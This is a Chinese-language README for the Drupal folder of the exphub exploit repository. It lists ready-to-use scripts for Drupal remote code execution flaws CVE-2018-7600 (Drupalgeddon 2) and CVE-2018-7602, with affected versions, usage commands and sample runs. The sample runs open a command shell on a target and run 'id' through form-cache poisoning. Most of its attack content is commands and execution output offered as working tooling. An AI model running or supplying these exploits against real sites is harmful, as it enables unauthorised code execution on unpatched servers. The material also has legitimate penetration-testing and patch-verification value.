# About Drupal
Drupal是使用PHP语言编写的开源内容管理框架（CMF），它由内容管理系统（CMS）和PHP开发框架（Framework）共同构成。连续多年荣获全球最佳CMS大奖，是基于PHP语言最著名的WEB应用程序。截止2011年底，共有13,802位WEB专家参加了Drupal的开发工作；228个国家使用181种语言的729,791位网站设计工作者使用Drupal。著名案例包括：联合国、美国白宫、美国商务部、纽约时报、华纳、迪斯尼、联邦快递、索尼、美国哈佛大学、Ubuntu等。

# Vulnerability list
[**cve-2018-7600_cmd.py**](https://github.com/zhzyker/exphub/tree/master/drupal) Drupal Drupalgeddon 2 远程代码执行漏洞利用脚本[[使用]](https://freeerror.org/d/426)  
[**cve-2018-7600_poc.py**](https://github.com/zhzyker/exphub/tree/master/drupal) 该脚本可检测 CVE-2018-7602 和 CVE-2018-7600  
[**cve-2018-7602_cmd.py**](https://github.com/zhzyker/exphub/tree/master/drupal) Drupal 内核远程代码执行漏洞利用脚本(需要账户密码)  
[**cve-2018-7602_poc.py**](https://github.com/zhzyker/exphub/tree/master/drupal) 该脚本可检测 CVE-2018-7602 和 CVE-2018-7600 

# Readme
部分脚本文件使用说明，详细使用分析请参考[vulnerability-list](https://github.com/zhzyker/exphub/tree/master/drupal#vulnerability-list)中的[使用]
- VER: 漏洞影响版本，一般情况下不在影响范围的版本没有相关漏洞
- USE: 脚本文件使用说明，大部分写在了脚本里，执行即可见
- EXP: 脚本利用示例，以及执行效果
- DES: 部分特殊脚本文件的特殊描述

## CVE-2018-7600_cmd.py	Drupal Drupalgeddon 2 远程代码执行漏洞利用脚本
> USE:
> ```
> +----------------------------------------------------------------------+
> + DES: by zhzyker as https://github.com/zhzyker/exphub                 +
> +      Drupal Drupalgeddon 2 远程代码执行 CVE-2018-7600                +
> +----------------------------------------------------------------------+
> + USE: python3 <filename> <url>                                        +
> + EXP: python3 cve-2018-7600_cmd.py http://1.1.1.1:8080                +
> + VER: Drupal 6.x                                                      +
> +      Drupal 7.x < 7.58                                               +
> +      Drupal 8.3 < 8.3.9                                              +
> +      Drupal 8.4 < 8.4.6                                              +
> +      Drupal 8.5 < 8.5.1                                              +
> +----------------------------------------------------------------------+
> + DES: Shell仅能回显一行代码，多行代码结果查看http://xxxx/exphub.txt   +
> +----------------------------------------------------------------------+
> ```
> EXP:
> ```
> zhzy@debian:$ python3 cve-2018-7600_cmd.py http://freeerror.org:8080
> [+] http://freeerror.org:8080/exphub.txt
> 
> Shell >>> id
> uid=33(www-data) gid=33(www-data) groups=33(www-data)
> Shell >>> whoami
> www-data
> Shell >>> exit
> ```

## CVE-2018-7600_poc.py	该脚本可检测 CVE-2018-7602 和 CVE-2018-7600
> EXP:
> ```
> zhzy@debian:$ python3 cve-2018-7600_poc.py http://freeerror.org:8081
> 
> +------------------------------------------------------------------+
> +                           iDrupal                                +
> +                          by IAmG0d                               +
> +------------------------------------------------------------------+
> + USE: python3 <filename> <url>                                    +
> + EXP: python3 cve-2018-7602_poc.py http://freeerror.org:8081      +
> +------------------------------------------------------------------+
> + DES: 该脚本可检测 CVE-2018-7602 和 CVE-2018-7600                 +
> +------------------------------------------------------------------+
> 
> [~] Checking the version of http://freeerror.org:8081/
> [+] Possibly vulnerable to CVE-2018-7600!
> [+] Possibly vulnerable to CVE-2018-7602!
> [0:)] Thank You For Using... Goodbye
> ```

## CVE-2018-7602_cmd.py	Drupal 内核远程代码执行漏洞利用脚本(需要账户密码)
> EXP:
> ```
> zhzy@debian:/debian/archives-tool/web-drupal$ python cve-2018-7602_cmd.py admin admin http://freeerror.org:8080 -c id
> ()
> +---------------------------------------------------------------------------------+
> +   DRUPAL 7 <= 7.58 REMOTE CODE EXECUTION (SA-CORE-2018-004 / CVE-2018-7602)     +
> +                                   by pimps                                      +
> +---------------------------------------------------------------------------------+
> + USE: python3 <filename> <username> <password> <url> -c <command>                +
> + EXP: python3 cve-2018-7602_cmd.py admin admin http://1.1.1.1:8080 -c "id"       +
> + VER: Drupal 7.x < 7.59                                                          +
> +      Drupal 8.4 < 8.4.8                                                         +
> +      Drupal 8.5 < 8.5.3                                                         +
> +---------------------------------------------------------------------------------+
> + DES: CVE-2018-7602 Need Username Password                                       +
> +---------------------------------------------------------------------------------+
> 
> [*] Creating a session using the provided credential...
> [*] Finding User ID...
> [*] User ID found: /user/1
> [*] Poisoning a form using 'destination' and including it in cache.
> [*] Poisoned form ID: form-6iAq8Ou5pKFQqEZ4sh1A_zQI_5QMSC71Stp4ohaseW0
> [*] Triggering exploit to execute: id
> uid=33(www-data) gid=33(www-data) groups=33(www-data)
> ```
